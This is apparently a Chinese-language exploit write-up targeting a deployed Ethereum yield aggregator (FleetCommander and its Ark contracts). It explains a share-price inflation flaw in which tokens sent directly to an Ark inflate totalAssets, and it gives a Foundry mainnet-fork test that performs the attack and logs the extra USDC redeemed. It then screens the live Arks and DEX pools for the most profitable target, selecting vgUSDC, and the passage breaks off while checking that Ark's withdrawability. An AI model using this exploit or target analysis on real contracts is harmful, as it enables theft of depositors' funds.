[0xC9dd080C9ecCFcdbf379714D84CdC8Bd01046AE1, 0xedC6a603B31391B7D13fBa6A721fd4DDa401f9eA, 0xDB6d68d571FbEF7D67827844DD800884EA9cc02E, 0x36D0501D07619274a398AFf16007337041873A6F, 0xCCBd61b6c2fB58Da5bbD8937Ca25164eF29c1cc4, 0x165D1accC5C6326e7EE4deeF75Ac3ffC8ce4D79B, 0xCa75E855a33acC44DDA9d48578Df5Df7602b5c35, 0x78f466314b2A69685e464431eDF7688cB77De131, 0x99d21C9c1D68CE0e9bbF77AE0c965Daa3Ab02c7e, 0x1Ae10e9425653177282E6054a5c828391a533aC7, 0xB10c29b85E388f3EC1189f8EBC78b3f71408Cd34, 0xb5e9c7Ad5bB1e21B12aD62066FF1Fb388ebdeB37, 0x8948a5F3D24F7A6d50FF36064e8cff33B2aF062f, 0x9890C99f504337C3500AC05c267c38dfcd41C3e2, 0xf8Db64D39D1c7382fE47De8B72435c7e9DFB2894, 0x3F9e195a8ee39Ed7B4a14A919F4a165c872976e5, 0x756ca6D02523c908972C4F82a4821c15F740D275, 0x679794389B05B0db3CbEdAcC908ff8Fb531fA53f, 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2, 0x7B1e86949C7B74761046d79Fb457985FB3a494F3, 0xcA2e14c7C03C9961c296C89e2d2279F5F7DB15b4, 0x0C939b702524fDaBa4914E905Bcb850182308141, 0x77e5f42d5cf2d1B9849AE6A5d2D7dC5b774f8290, 0x47F73542a9b59C2316832775C51cC99E6B468A67, 0x565a4c04E32fBf001AE36C4fB60584A687Ffa27C, 0xeBA9b3d4336802CcfbDB80AfBDA820e9Eef97f8e, 0xd0aAdDe147b6D683cBb80bFE0Fb9e8dB9De1958F, 0x81f025C87367033d87B6d3A95289B36106770B25, 0x857a0CaC1Ac29d8101822f8879E4e6918293c7b5]
```

buffer Ark:

```
cast call '0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17' 'bufferArk()' --from '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' --block 25471347  --rpc-url $RPC_ETH
```

得到

```
Output 0 (address) : 0x106CBB1F445F0bFFa7894F4199EE940BF7f6dD2B
```

所以我们得到了所有30个Ark地址

```
[0xC9dd080C9ecCFcdbf379714D84CdC8Bd01046AE1, 0xedC6a603B31391B7D13fBa6A721fd4DDa401f9eA, 0xDB6d68d571FbEF7D67827844DD800884EA9cc02E, 0x36D0501D07619274a398AFf16007337041873A6F, 0xCCBd61b6c2fB58Da5bbD8937Ca25164eF29c1cc4, 0x165D1accC5C6326e7EE4deeF75Ac3ffC8ce4D79B, 0xCa75E855a33acC44DDA9d48578Df5Df7602b5c35, 0x78f466314b2A69685e464431eDF7688cB77De131, 0x99d21C9c1D68CE0e9bbF77AE0c965Daa3Ab02c7e, 0x1Ae10e9425653177282E6054a5c828391a533aC7, 0xB10c29b85E388f3EC1189f8EBC78b3f71408Cd34, 0xb5e9c7Ad5bB1e21B12aD62066FF1Fb388ebdeB37, 0x8948a5F3D24F7A6d50FF36064e8cff33B2aF062f, 0x9890C99f504337C3500AC05c267c38dfcd41C3e2, 0xf8Db64D39D1c7382fE47De8B72435c7e9DFB2894, 0x3F9e195a8ee39Ed7B4a14A919F4a165c872976e5, 0x756ca6D02523c908972C4F82a4821c15F740D275, 0x679794389B05B0db3CbEdAcC908ff8Fb531fA53f, 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2, 0x7B1e86949C7B74761046d79Fb457985FB3a494F3, 0xcA2e14c7C03C9961c296C89e2d2279F5F7DB15b4, 0x0C939b702524fDaBa4914E905Bcb850182308141, 0x77e5f42d5cf2d1B9849AE6A5d2D7dC5b774f8290, 0x47F73542a9b59C2316832775C51cC99E6B468A67, 0x565a4c04E32fBf001AE36C4fB60584A687Ffa27C, 0xeBA9b3d4336802CcfbDB80AfBDA820e9Eef97f8e, 0xd0aAdDe147b6D683cBb80bFE0Fb9e8dB9De1958F, 0x81f025C87367033d87B6d3A95289B36106770B25, 0x857a0CaC1Ac29d8101822f8879E4e6918293c7b5, 0x106CBB1F445F0bFFa7894F4199EE940BF7f6dD2B]
```



### 探测各个Ark返回totalAssets()的算法

分析发现30个Ark全部verified, 所以抽样几个,下载源码看算法

```
0xb10c29b85e388f3ec1189f8ebc78b3f71408cd34
src/contracts/arks/MorphoVaultArk.sol
    function totalAssets() public view override returns (uint256 assets) {
        uint256 shares = metaMorpho.balanceOf(address(this));
        if (shares > 0) {
            assets = metaMorpho.convertToAssets(shares);
        }
    }
    
---
0x8948a5f3d24f7a6d50ff36064e8cff33b2af062f
src/contracts/arks/SparkArk.sol
    function totalAssets() public view override returns (uint256 assets) {
        assets = IERC20(spToken).balanceOf(address(this));
    }
    
---
0x9890c99f504337c3500ac05c267c38dfcd41c3e2
src/contracts/arks/SkyUsdsArk.sol
    function totalAssets() public view override returns (uint256 assets) {
        uint256 balance = stakedUsds.balanceOf(address(this));
        if (balance > 0) {
            assets =
                stakedUsds.convertToAssets(balance) /
                TO_18_DECIMALS_CONVERSION_FACTOR;
        }
    }
    
---
0x3f9e195a8ee39ed7b4a14a919f4a165c872976e5
src/contracts/arks/SyrupArk.sol
    function totalAssets()
        public
        view
        override(Ark, IArk)
        returns (uint256 assets)
    {
        assets += _withdrawableTotalAssets();
        assets += assetsInWithdrawalQueue();

        // Add value of shares held by Ark
        uint256 sharesInArk = vault.balanceOf(address(this));
        if (sharesInArk > 0) {
            assets += vault.convertToAssets(sharesInArk);
        }
    }

---
0xd0aadde147b6d683cbb80bfe0fb9e8db9de1958f
src/contracts/arks/ERC4626Ark.sol
    function totalAssets() public view override returns (uint256 assets) {
        uint256 shares = vault.balanceOf(address(this));
        if (shares > 0) {
            assets = vault.convertToAssets(shares);
        }
    }

---
0x81f025c87367033d87b6d3a95289b36106770b25
src/contracts/arks/ERC4626Ark.sol
    function totalAssets() public view override returns (uint256 assets) {
        uint256 shares = vault.balanceOf(address(this));
        if (shares > 0) {
            assets = vault.convertToAssets(shares);
        }
    }

---
0x857a0cac1ac29d8101822f8879e4e6918293c7b5
src/contracts/arks/ERC4626Ark.sol
    function totalAssets() public view override returns (uint256 assets) {
        uint256 shares = vault.balanceOf(address(this));
        if (shares > 0) {
            assets = vault.convertToAssets(shares);
        }
    }

---
0x106cbb1f445f0bffa7894f4199ee940bf7f6dd2b
src/contracts/arks/BufferArk.sol
    function totalAssets() public view override returns (uint256) {
        return config.asset.balanceOf(address(this));
    }

```

通过上面的源代码发现, 他们返回的`totalAssets()` 全部和 `ark在底层金库的余额` 正相关. 也就是说, ark在底层金库的余额越大, 返回的总资产就越多



## 漏洞发现

已发现的知识:

存款的时候 用户用底层资产assets能得到多少shares的计算公式是

`shares = floor(assets × totalSupply() / sum_of_assets_of_all_arks)`

取款的时候, 用户用shares能换回多少底层资产的计算公式为

`assets = floor( shares × sum_of_assets_of_all_arks / totalSupply() )`

为了节约对外部Ark的调用的gas费用, 创建了 `FleetCommanderCache.sol`, 并通过 `useCache` 这个modifier来使用了它

totalSupply() : 就是单纯的 IECR20.totalSupply(), 也直接调用 FleetCommander.totalSupply(), 非常简单

assets shares 是用户传入的参数(或根据传入参数简单计算出来的临时值), 也很简单

sum_of_assets_of_all_arks: 所有Ark的总资产总和(包括buffer_ark), 每一笔存款或取款成功之后都会让缓存失效,然后下次存款或取款的时候遍历每个ark的 `IArk(arks[i]).totalAssets()` 来进行累加得到`sum_of_assets_of_all_arks` , 也就是 `FleetCommander.totalAssets()`. 其中每一个 ark.totalAssets()的返回又和该Ark在底层金库的余额`balanceOf`正相关

### 漏洞
`vault.balanceOf(address(ark))` : 向ark发送vault代币, 它对应的余额就会被动增加

所以:

存款的时候: 正常存,FleetCommander扫描各个Ark得到正常的totalAssets()进行存款计算, 存款成功后, FleetCommander的缓存失效.

取款之前:

向ark发送vault代币

  -> 导致: vault.balanceOf(address(ark)) 增加 

  -> 导致 ark向外汇报的 totalAssets 增加

发起取款请求

  -> 由于缓存失效, FleetCommander重新扫描各个Ark,得到异常的Ark.totalAssets() 进行累加

  -> 导致 `FleetCommander.totalAssets()`增加

  -> shares × FleetCommander.totalAssets() / FleetCommander.totalSupply() 增加

所以相同的shares能比正常取款取出更多的底层资产



### 验证

以 0xb10c29b85e388f3ec1189f8ebc78b3f71408cd34 为例 block=25471347

找到 MetaMorpho的一个holder比如0xf842fc07e5038d88db957a6be0133afb0af01ac3 (etherscan pro账号或dune查询可以找到), 然后使用vm.prank让holder转账给实验账号以完成实验

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IFleetCommander {
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function previewDeposit(uint256) external view returns (uint256);
    function previewRedeem(uint256) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function asset() external view returns (address);
    function balanceOf(address) external view returns (uint256);
}

/// @title MorphoVaultArkInflationProbe
/// @notice Prove: an external transfer of vault shares to an Ark
///         changes FleetCommander.totalAssets(), which changes how much
///         USDC a fixed amount of LVUSDC shares can redeem.
///
///  Verified:
///    1. Deposit USDC → get LVUSDC shares
///    2. Transfer vault shares to Ark → Ark.totalAssets() ↑
///    3. FleetCommander.totalAssets() ↑ (cache invalidated, re-scanned)
///    4. Same LVUSDC shares → redeemable USDC ↑
contract MorphoVaultArkInflationProbe is Test {
    IFleetCommander constant FC = IFleetCommander(0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17);
    address constant MORPHO_VAULT_ARK = 0xB10c29b85E388f3EC1189f8EBC78b3f71408Cd34;

    address constant METAMORPHO        = 0xdd0f28e19C1780eb6396170735D45153D261490d;
    address constant METAMORPHO_HOLDER = 0xf842fC07e5038d88db957a6BE0133AFB0Af01ac3;

    uint256 constant BLOCK = 25471347;

    IERC20 usdc;
    IERC20 metaMorpho;

    address attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("eth", BLOCK);
        usdc = IERC20(FC.asset());
        metaMorpho = IERC20(METAMORPHO);
    }

    function testInflationViaVaultShareTransfer() public {
        // ──── State before ────
        uint256 fcTA_before    = FC.totalAssets();
        uint256 arkTA_before   = _totalAssets(MORPHO_VAULT_ARK);
        uint256 arkVaultBal    = metaMorpho.balanceOf(MORPHO_VAULT_ARK);
        uint256 metaMorphoSym  = metaMorpho.balanceOf(METAMORPHO_HOLDER);
        uint256 preview1k      = FC.previewDeposit(1000e6); // $1000

        console.log("=== STATE BEFORE ===");
        console.log("FC.totalAssets:                    ", fcTA_before);
        console.log("Ark.totalAssets:                   ", arkTA_before);
        console.log("Ark vault share balance (vault):   ", arkVaultBal);
        console.log("Holder vault share balance:        ", metaMorphoSym);
        console.log("FC.previewDeposit($1000):          ", preview1k);
        console.log("");

        // ──── Attack simulation ────

        // Step 1: deposit $50K at the normal price (pre-inflate)
        uint256 depositAmount = 50000e6;
        deal(address(usdc), attacker, depositAmount);

        vm.startPrank(attacker);
        usdc.approve(address(FC), depositAmount);
        uint256 myShares = FC.deposit(depositAmount, attacker);
        vm.stopPrank();

        console.log("=== AFTER DEPOSIT (pre-inflate) ===");
            console.log("Deposited USDC:                     ", depositAmount);
            console.log("Got LVUSDC shares:                  ", myShares);

            // Capture what these shares would redeem for BEFORE inflate
            uint256 redeemableBefore = FC.previewRedeem(myShares);
            console.log("Redeemable (pre-inflate):           ", redeemableBefore);
            console.log("");

            // Step 2: Transfer MetaMorpho shares from holder to Ark (inflate)
            // Drain holder's entire balance
            uint256 inflateAmount = metaMorpho.balanceOf(METAMORPHO_HOLDER);
            vm.prank(METAMORPHO_HOLDER);
            metaMorpho.transfer(MORPHO_VAULT_ARK, inflateAmount);

            uint256 fcTA_after   = FC.totalAssets();
            uint256 arkTA_after  = _totalAssets(MORPHO_VAULT_ARK);
            uint256 preview1k2   = FC.previewDeposit(1000e6);

            console.log("=== AFTER INFLATE (vault share transfer) ===");
            console.log("Vault shares transferred to Ark:    ", inflateAmount);
            console.log("FC.totalAssets:                     ", fcTA_after);
            console.log("FC.totalAssets delta:               ", fcTA_after - fcTA_before);
            console.log("Ark.totalAssets:                    ", arkTA_after);
            console.log("Ark.totalAssets delta:              ", arkTA_after - arkTA_before);
            console.log("FC.previewDeposit($1000):           ", preview1k2);

            // Same shares, now with inflated totalAssets
            uint256 redeemableAfter = FC.previewRedeem(myShares);
            console.log("Redeemable (post-inflate):          ", redeemableAfter);
            console.log("");

            console.log("==============================================");
            console.log("  Same shares, different totalAssets");
            console.log("==============================================");
            console.log("LVUSDC shares:                      ", myShares);
            console.log("Redeemable BEFORE inflate:          ", redeemableBefore);
            console.log("Redeemable AFTER  inflate:          ", redeemableAfter);
            console.log("Redemption increase:                +", redeemableAfter - redeemableBefore);
            console.log("");
            console.log("(This delta exists purely because Ark.totalAssets()");
            console.log(" went up after the vault-share transfer, which");
            console.log(" changed FleetCommander.totalAssets().)");

        // ──── Also execute redeem to verify ────
        vm.startPrank(attacker);
        uint256 actualRedeemed = FC.redeem(myShares, attacker, attacker);
        vm.stopPrank();
        console.log("");
        console.log("Actual redeem executed:             ", actualRedeemed);
        console.log("USDC balance of attacker now:       ", usdc.balanceOf(attacker));
        console.log("LVUSDC left:                        ", FC.balanceOf(attacker));
    }

    function _totalAssets(address ark) internal view returns (uint256) {
        (bool ok, bytes memory d) = ark.staticcall(abi.encodeWithSignature("totalAssets()"));
        return (ok && d.length >= 32) ? abi.decode(d, (uint256)) : 0;
    }
}

```

```
 forge test  --match-test testInflationViaVaultShareTransfer  -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/MorphoVaultArkInflationProbe.t.sol:MorphoVaultArkInflationProbe
[PASS] testInflationViaVaultShareTransfer() (gas: 4274705)
Logs:
  === STATE BEFORE ===
  FC.totalAssets:                     9680827973743
  Ark.totalAssets:                    284184158730
  Ark vault share balance (vault):    253247075004651044131691
  Holder vault share balance:         9956349452357368864847
  FC.previewDeposit($1000):           937660514

  === AFTER DEPOSIT (pre-inflate) ===
  Deposited USDC:                      50000000000
  Got LVUSDC shares:                   46883025739
  Redeemable (pre-inflate):            49999999999

  === AFTER INFLATE (vault share transfer) ===
  Vault shares transferred to Ark:     9956349452357368864847
  FC.totalAssets:                      9742000607397
  FC.totalAssets delta:                61172633654
  Ark.totalAssets:                     295356792384
  Ark.totalAssets delta:               11172633654
  FC.previewDeposit($1000):            936585156
  Redeemable (post-inflate):           50057408442

  ==============================================
    Same shares, different totalAssets
  ==============================================
  LVUSDC shares:                       46883025739
  Redeemable BEFORE inflate:           49999999999
  Redeemable AFTER  inflate:           50057408442
  Redemption increase:                + 57408443

  (This delta exists purely because Ark.totalAssets()
   went up after the vault-share transfer, which
   changed FleetCommander.totalAssets().)

  Actual redeem executed:              50057408442
  USDC balance of attacker now:        50057408442
  LVUSDC left:                         0

```

"+57408443": 证明漏洞的确存在

## 漏洞利用

相比于上面的漏洞验证, 实际要进行漏洞利用还得考虑下面的问题

1, 如何获得某个或某几个ARK底层Vault的大量代币,以便实现大量transfer注水

2, 投入产出比, 大量transfer注水是需要成本的



### ark 调查与筛选

```
Ark: 0xC9dd080C9ecCFcdbf379714D84CdC8Bd01046AE1 AaveV3-usdc-1
totalAssets: 0
Vault Token: 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c aEthUSDC
Vault Token Liquidity Info: Uniswap V3 Factory:0x1F98431c8aD98523631AE4a59f267346ea31F984 /USDC·500bps Price:0.999751 USDC Liquidity:13317486020 Pair:0xc1a06B9Ad9a552d66e511DE88c402cf7B04eb1f5

Ark: 0xedC6a603B31391B7D13fBa6A721fd4DDa401f9eA CompoundV3-usdc-1
totalAssets: 0
Vault Token: 0xc3d688B66703497DAA19211EEdff47f25384cdc3 Compound USDC 
Vault Token Liquidity Info: Uniswap V2 Factory:0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f /USDC Price:0.918457 USDC Liquidity:10537635 Pair:0xD4b4eE9fFbA24124B3BE293965D308BBF463664C

Ark: 0xDB6d68d571FbEF7D67827844DD800884EA9cc02E ERC4626-Fluid-usdc-1
totalAssets: 0
Vault Token: 0x9Fb7b4477576Fe5B32be4C1843aFB1e55F251B33 fUSDC
Vault Token Liquidity Info: Not found

Ark: 0x36D0501D07619274a398AFf16007337041873A6F ERC4626-Gearbox-usdc-1
totalAssets: 0
Vault Token: 0xda00000035fef4082F78dEF6A8903bee419FbF8E dUSDCV3
Vault Token Liquidity Info: Not found

Ark: 0xCCBd61b6c2fB58Da5bbD8937Ca25164eF29c1cc4 ERC4626-Euler_Prime-usdc-1
totalAssets: 0
Vault Token: 0x797DD80692c3b2dAdabCe8e30C07fDE5307D48a9 eUSDC-2
Vault Token Liquidity Info: Not found

Ark: 0x165D1accC5C6326e7EE4deeF75Ac3ffC8ce4D79B ERC4626-Euler_Yield-usdc-1
totalAssets: 0
Vault Token: 0xe0a80d35bB6618CBA260120b279d357978c42BCE eUSDC-22
Vault Token Liquidity Info: Not found

Ark: 0xCa75E855a33acC44DDA9d48578Df5Df7602b5c35 ERC4626-Euler_Stablecoin_Maxi-usdc-1
totalAssets: 0
Vault Token: 0xce45EF0414dE3516cAF1BCf937bF7F2Cf67873De eUSDC-8
Vault Token Liquidity Info: Not found

Ark: 0x78f466314b2A69685e464431eDF7688cB77De131 MorphoVault-usdc-Gauntlet_USDC_Core-1
totalAssets: 0
Vault Token: 0x8eB67A509616cd6A7c1B3c8C21D48FF57df3d458 gtUSDCcore
Vault Token Liquidity Info: Uniswap V3	Factory:0x1F98431c8aD98523631AE4a59f267346ea31F984	/USDC·100bps Price:1 USDC Liquidity:3	Pair:0xc65E7B9a0a8B05193e755AB23BCF41fC2282Dfd8

Ark: 0x99d21C9c1D68CE0e9bbF77AE0c965Daa3Ab02c7e MorphoVault-usdc-Flagship_USDC-1
totalAssets: 
Vault Token: 0x186514400e52270cef3D80e1c6F8d10A75d47344 Flagship USDC
Vault Token Liquidity Info: Not found

Ark: 0x1Ae10e9425653177282E6054a5c828391a533aC7 MorphoVault-usdc-Steakhouse-1
totalAssets: 0
Vault Token: 0xBEEF01735c132Ada46AA9aA4c54623cAA92A64CB steakUSDC
Vault Token Liquidity Info: Not found

Ark: 0xB10c29b85E388f3EC1189f8EBC78b3f71408Cd34 MorphoVault-usdc-Gauntlet_USDC_Prime-1
totalAssets: 284184158730
Vault Token: 0xdd0f28e19C1780eb6396170735D45153D261490d gtUSDC
Vault Token Liquidity Info: Not found

Ark: 0xb5e9c7Ad5bB1e21B12aD62066FF1Fb388ebdeB37 MorphoVault-usdc-RE7_USDC-1
totalAssets: 0
Vault Token: 0x60d715515d4411f7F43e4206dc5d4a3677f0eC78 Re7USDC
Vault Token Liquidity Info: Not found

Ark: 0x8948a5F3D24F7A6d50FF36064e8cff33B2aF062f Spark-usdc-1
totalAssets: 1294220778910
Vault Token: 0x377C3bd93f2a2984E1E7bE6A5C22c525eD4A4815 spUSDC
Vault Token Liquidity Info: Not found

Ark: 0x9890C99f504337C3500AC05c267c38dfcd41C3e2 SkyUsds-usdc-1
totalAssets: 25835626398
Vault Token: 0xa3931d71877C0E7a3148CB7Eb4463524FEc27fbD sUSDS
Vault Token Liquidity Info: Balancer v3 Weighted	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/phUSD	Price:1.14188 phUSD	REF	Liquidity:22788566628115646206201	Pair:0x642bb6860b4776cc10b26b8f361fd139e7f0db04	Router:0xAE563E3f8219521950555F5962419C8919758Ea2

Ark: 0xf8Db64D39D1c7382fE47De8B72435c7e9DFB2894 MorphoVault-usdc-Smokehouse_USDC-1
totalAssets: 0
Vault Token: 0xBEeFFF209270748ddd194831b3fa287a5386f5bC bbqUSDC
Vault Token Liquidity Info: Not found

Ark: 0x3F9e195a8ee39Ed7B4a14A919F4a165c872976e5 Syrup-usdc-1
totalAssets: 4040415468709
Vault Token: 0x80ac24aA929eaF5013f6436cdA2a7ba190f5Cc0b syrupUSDC
Vault Token Liquidity Info: Balancer Composable_Stable	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/syrupUSDC/USDC	Liquidity:506806787	Pair:0x0195538979e579d49999f780c04fc4bf68778b6f	Router:0xBA12222222228d8Ba445958a75a0704d566BF2C8

Ark: 0x756ca6D02523c908972C4F82a4821c15F740D275 MorphoVault-usdc-Hyperithm_USDC-1
totalAssets: 0
Vault Token: 0x777791C4d6DC2CE140D00D2828a7C93503c67777 hyperUSDCa
Vault Token Liquidity Info: V3	Uniswap V3	Factory:0x1F98431c8aD98523631AE4a59f267346ea31F984	/USDC·100bps	Price:0.0999903 USDC	Liquidity:0	Pair:0xF3baB3831f1BB65512d2AFc3982C2a989718e2D6

Ark: 0x679794389B05B0db3CbEdAcC908ff8Fb531fA53f MorphoVault-usdc-Vault_Bridge_USDC-1
totalAssets: 0
Vault Token: 0xBEefb9f61CC44895d8AEc381373555a64191A9c4 vbshUSDC
Vault Token Liquidity Info: Not found

Ark: 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2 SiloManagedVault-valamore_usdc_growth-usdc-1
totalAssets: 0
Vault Token: 0x8399C8Fc273bD165C346Af74A02e65f10e4FD78F vgUSDC
Vault Token Liquidity Info: Balancer v3 Stable	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/xUSD	Price:0.000127 xUSD	REF	Liquidity:352835152721396852	Pair:0xae255db04ba78519f33871c557d8fd6bafdb83bd	Router:0xAE563E3f8219521950555F5962419C8919758Ea2

Ark: 0x7B1e86949C7B74761046d79Fb457985FB3a494F3 FluidFToken-usdc-1
totalAssets: 0
Vault Token: 0x9Fb7b4477576Fe5B32be4C1843aFB1e55F251B33 fUSDC
Vault Token Liquidity Info: Not found

Ark: 0xcA2e14c7C03C9961c296C89e2d2279F5F7DB15b4 MorphoVault-usdc-kpk_USDC_Prime-1
totalAssets: 0
Vault Token: 0xe108fbc04852B5df72f9E44d7C29F47e7A993aDd kpk_USDC_Prime
Vault Token Liquidity Info: Balancer v3 Stable	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/pmUSD	Price:1.36707 pmUSD	REF	Liquidity:2706034845359537882350	Pair:0xe00e947decfe01692070e113002705bdf77ddbd3	Router:0xAE563E3f8219521950555F5962419C8919758Ea2

Ark: 0x0C939b702524fDaBa4914E905Bcb850182308141 ERC4626-Morpho_V2_Gauntlet_USDC_Prime-usdc-1
totalAssets: 0
Vault Token: 0x8c106EEDAd96553e64287A5A6839c3Cc78afA3D0 gtusdcp
Vault Token Liquidity Info: Balancer v3 Stable	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/kpk_USDT_PrimeV2	Price:1.01564 kpk_USDT_PrimeV2	REF	Liquidity:1285720894143646672	Pair:0xac7bcc5730e68bfaed5c56de1ba5281bca2e0305	Router:0xAE563E3f8219521950555F5962419C8919758Ea2

Ark: 0x77e5f42d5cf2d1B9849AE6A5d2D7dC5b774f8290 ERC4626-Morpho_V2_KPK_USDC_Prime_v2-usdc-1
totalAssets: 0
Vault Token: 0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6 KPK_USDC_Prime
Vault Token Liquidity Info: Balancer v3 Stable	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/sJUSD	Price:0.993168 sJUSD	REF	Liquidity:3466773120437854480	Pair:0xb20fa48d028b5ba6de33e09c72643c1fe92f8fcd	Router:0xAE563E3f8219521950555F5962419C8919758Ea2

Ark: 0x47F73542a9b59C2316832775C51cC99E6B468A67 ERC4626-Morpho_V2_API3_Core_USDC-usdc-1
totalAssets: 0
Vault Token: 0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b Api3CoreUSDC
Vault Token Liquidity Info: Not found

Ark: 0x565a4c04E32fBf001AE36C4fB60584A687Ffa27C ERC4626-Morpho_V2_Avantgarde_USDC_Conservative-usdc-1
totalAssets: 0
Vault Token:  0xeBBaE8CfAbB0092d5B32f00EBeE0c8139d24dDcd AVGUSDCcons
Vault Token Liquidity Info: Not found

Ark: 0xeBA9b3d4336802CcfbDB80AfBDA820e9Eef97f8e MorphoV2Vault-usdc-Gauntlet_USDC_Prime-1
totalAssets: 0
Vault Token: 0x8c106EEDAd96553e64287A5A6839c3Cc78afA3D0 gtusdcp
Vault Token Liquidity Info: Balancer v3 Stable	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/kpk_USDT_PrimeV2	Price:1.01564 kpk_USDT_PrimeV2	REF	Liquidity:1285720894143646672	Pair:0xac7bcc5730e68bfaed5c56de1ba5281bca2e0305	Router:0xAE563E3f8219521950555F5962419C8919758Ea2

Ark: 0xd0aAdDe147b6D683cBb80bFE0Fb9e8dB9De1958F MorphoV2Vault-usdc-KPK_USDC_Prime_v2-1
totalAssets: 3030947450858
Vault Token: 0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6 KPK_USDC_Prime
Vault Token Liquidity Info: Balancer v3 Stable	Factory:0xBA12222222228d8Ba445958a75a0704d566BF2C8	/sJUSD	Price:0.993168 sJUSD	REF	Liquidity:3466773120437854480	Pair:0xb20fa48d028b5ba6de33e09c72643c1fe92f8fcd	Router:0xAE563E3f8219521950555F5962419C8919758Ea2

Ark: 0x81f025C87367033d87B6d3A95289B36106770B25 MorphoV2Vault-usdc-API3_Core_USDC-1
totalAssets: 969759238282
Vault Token: 0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b Api3CoreUSDC
Vault Token Liquidity Info: Not found

Ark: 0x857a0CaC1Ac29d8101822f8879E4e6918293c7b5 MorphoV2Vault-usdc-Avantgarde_USDC_Conservative-1
totalAssets: 34465251856
Vault Token: 0xeBBaE8CfAbB0092d5B32f00EBeE0c8139d24dDcd AVGUSDCcons
Vault Token Liquidity Info: Not found

Ark: 0x106CBB1F445F0bFFa7894F4199EE940BF7f6dD2B BufferArk
totalAssets: 1000000000
Vault Token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 USDC  (从config.asset属性得到的)
Vault Token Liquidity Info: (too much)

```

(注意, 上面的 "Not Found" 只代表我在常用的池子中没有找到, 并不代表100%没有)

**1, 第一轮：删掉根本买不到的（无 DEX 池子）**

有 17 个 Ark 的 Vault Token 在主流 DEX（Uniswap/Balancer）上查不到任何流动性池。没池子 = 没法 swap = 没法搞到 token = 直接淘汰。

剩下有池子的：aEthUSDC、cUSDC、gtUSDCcore、sUSDS、hyperUSDCa、vgUSDC、kpk_USDC_Prime、KPK_USDC_Prime、gtusdcp、syrupUSDC。10 个。

**2, 第二轮：删掉没有折价的（买 1 块账面资产要花 1 块）**

注水的本质是：在 DEX 上低价买入 token，转给 Ark 后 Ark 按 vault 内部汇率（接近 $1）计入 `totalAssets`。如果 DEX 价格本身就接近 $1，那买 1 块钱账面价值就要花 1 块钱——亏手续费，没得赚。

- aEthUSDC：DEX 价格 0.999751 ≈ 几乎没折价
- gtUSDCcore：DEX 价格 1.00 
- sUSDS：DEX 价格 vs phUSD=1.14188，但这不是对 USDC 的价，且是溢价不是折价
- kpk_USDC_Prime、KPK_USDC_Prime、gtusdcp：价格都在 0.99-1.37 附近，几乎没有折价甚至溢价
- syrupUSDC：Balancer 池子 syrupUSDC/USDC 几乎 1:1 

剩下：cUSDC、hyperUSDCa、vgUSDC 3 个。

**3, 第三轮：删掉池子太浅或已经死掉的**

- hyperUSDCa：DEX 价格 0.09999（看起来折价很大），但流动性 0——池子死的，根本买不到 
- cUSDC：DEX 价格 0.918457，有 ~8% 折价。但池子总流动性只有 $10.5M。如果砸 $100K 进去，滑点会把价格推到接近 $1，折价消失 → 所以它池子不够深

**最终唯一候选**

SiloManagedVault-valamore_usdc_growth-usdc-1 (0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2) vault token: vgUSDC (0x8399C8Fc273bD165C346Af74A02e65f10e4FD78F) DEX 价格: 0.000127（对 xUSD，极限折价） DEX 池子: Balancer v3 Stable Liquidity:352835152721396852，有深度

它是唯一满足下面3个条件的

- DEX 上有池子（买得到）

- DEX 价格相比 vault 内部汇率有折价（投入产出比 > 1）

- 池子够深（买得够多，但不会把折价抹平）

## 赎回卡住了: SiloManagedVaultArk 本身取不出来

选定 vgUSDC 之后先别急着算注水金额, 回到 SiloManagedVaultArk 自己, 看看它现在到底能不能正常取钱:

```bash
cast call 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2 "totalAssets()(uint256)" --block 25471347 --rpc-url $RPC_ETH
# 0

cast call 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2 "withdrawableTotalAssets()(uint256)" --block 25471347 --rpc-url $RPC_ETH
# 0
```

`totalAssets()` 是 0 好理解, 现在 Ark 里本来就没有 vgUSDC。但 `withdrawableTotalAssets()` 也是 0, 这个就要多想一步。同样挂在主 FleetCommander 下面的另外三个 MorphoV2VaultArk (分别对应 API3 / Avantgarde / KPK 三个 MetaMorpho V2 金库), `totalAssets()` 都是几万到几百万美元的量级, 但 `withdrawableTotalAssets()` 全部是 0:

| Ark | totalAssets | withdrawableTotalAssets |
|---|---|---|
| API3 (`0x81f025C87367033d87B6d3A95289B36106770B25`) | 969759238282 | 0 |
| Avantgarde (`0x857a0CaC1Ac29d8101822f8879E4e6918293c7b5`) | 34465251856 | 0 |
| KPK (`0xd0aAdDe147b6D683cBb80bFE0Fb9e8dB9De1958F`) | 3030947450858 | 0 |

